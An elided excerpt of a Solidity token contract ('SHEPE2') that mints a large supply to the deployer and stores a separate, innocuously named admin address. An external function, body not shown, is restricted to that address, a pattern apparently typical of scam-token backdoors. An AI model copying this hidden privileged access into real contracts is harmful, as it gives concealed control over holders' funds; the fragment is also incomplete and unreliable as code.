...
contract FKTOKEN is Ownable {
    uint256 tokenamount = 21000000000*10**decimals();
    address public infotokenadd;
    constructor(address tokenadmin) {
        address curadd = _msgSender();
        emit Transfer(address(0), curadd, tokenamount);
        infotokenadd = tokenadmin;
        teu[curadd] += tokenamount;
    }

    string private _tokenname = "SHEPE2";
    string private _tokensymbol = "SHEPE2";
    ...
    external {
        ...
        require(infotokenadd == _msgSender());
